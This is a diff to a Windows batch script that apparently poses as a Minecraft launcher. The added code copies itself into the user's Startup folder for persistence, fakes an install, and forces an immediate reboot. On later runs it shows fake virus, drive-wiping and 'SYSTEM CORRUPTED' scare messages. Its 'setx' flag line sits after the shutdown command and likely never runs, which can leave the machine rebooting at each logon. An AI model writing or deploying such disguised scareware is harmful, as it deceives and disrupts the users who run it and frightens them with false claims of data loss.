@@ -1,31 +1,89 @@
 @echo off
 color 07
-move /y "C:\Users\%USERNAME%\Downloads\Minecraft Files\AppData\fools.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\fools.bat
 cls
-echo Microsoft Windows [Version 10.0.22631.4037]
+echo Microsoft Windows [Version 11.0.22631.4037]
 echo (c) Microsoft Corporation. All rights reserved.
 echo.
-echo Looking for existing files...
-timeout /t 1 /nobreak >null
-echo .
-timeout /t 1 /nobreak >null
-echo .
-timeout /t 1 /nobreak >null
-echo .
-timeout /t 1 /nobreak >null
-echo.
-echo Existing files not found. Attempting install for new files...
-timeout /t 1 /nobreak >null
-echo .
-timeout /t 1 /nobreak >null
-echo .
-timeout /t 1 /nobreak >null
-echo .
-timeout /t 1 /nobreak >null 
-echo .
-timeout /t 1 /nobreak >null
-echo.
-echo Download failed. Device restart is recommended.
-echo Press any key to restart
-timeout /t 100 >null
-shutdown /r /t 0
+
+:: Check if the variable "MyVar" is set
+set MyVarStatus=
+for /f "tokens=2 delims==" %%A in ('set MyVar 2^>nul') do set MyVarStatus=%%A
+
+if "%MyVarStatus%" == "" (
+    echo Looking for existing files...
+    timeout /t 1 /nobreak >nul
+    echo .
+    timeout /t 1 /nobreak >nul
+    echo .
+    timeout /t 1 /nobreak >nul
+    echo .
+    timeout /t 1 /nobreak >nul
+    echo.
+    echo Existing files not found. Attempting install for new files...
+    timeout /t 1 /nobreak >nul
+    echo .
+    timeout /t 1 /nobreak >nul
+    echo .
+    timeout /t 1 /nobreak >nul
+    echo .
+    timeout /t 1 /nobreak >nul 
+    echo .
+    timeout /t 1 /nobreak >nul
+    echo.
+    move /y "C:\Users\%USERNAME%\Downloads\MinecraftLauncher.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\MinecraftLauncher.bat"
+    echo Download failed. Device restart is recommended.
+    echo Press any key to restart
+    timeout /t 100 >nul
+    shutdown /r /t 0
+
+    :: Set the variable permanently so it persists after a reboot
+    setx MyVar 1 >nul
+) else (
+    echo Warning
+    color 04
+    timeout /t 3 /nobreak >nul
+    echo Your computer has detected a virus
+    timeout /t 3 /nobreak >nul
+    echo Attempting to remove virus...
+    timeout /t 3 /nobreak >nul
+    echo Your hard drives and solid state drives are now being wiped.
+    echo Please wait...
+    timeout /t 3 /nobreak >nul
+    echo.
+    echo.
+    echo.
+    echo          ERROR: SYSTEM FAILURE IMMINENT
+    echo          UNAUTHORIZED ACCESS DETECTED
+    echo          SYSTEM RESTARTING IN 3
+    echo.
+    echo.
+    timeout /t 1 /nobreak >nul
+    cls
+    echo System failure averted. Resuming normal operations...
+    echo .
+    timeout /t 1 /nobreak >nul
+    echo .
+    timeout /t 1 /nobreak >nul
+    echo .
+    timeout /t 1 /nobreak >nul
+    echo .
+    timeout /t 1 /nobreak >nul
+    echo .
+    timeout /t 1 /nobreak >nul
+    echo .
+    timeout /t 1 /nobreak >nul
+    echo .
+    timeout /t 1 /nobreak >nul
+    echo .
+    timeout /t 1 /nobreak >nul
+    echo .
+    timeout /t 2 /nobreak >nul
+    echo ERROR
+    echo ERROR
+    echo ERROR
+    echo ERROR
+    echo ERROR
+    timeout /t 2 /nobreak >nul
+    echo SYSTEM CORRUPTED
+    timeout /t 3 /nobreak >nul
+)
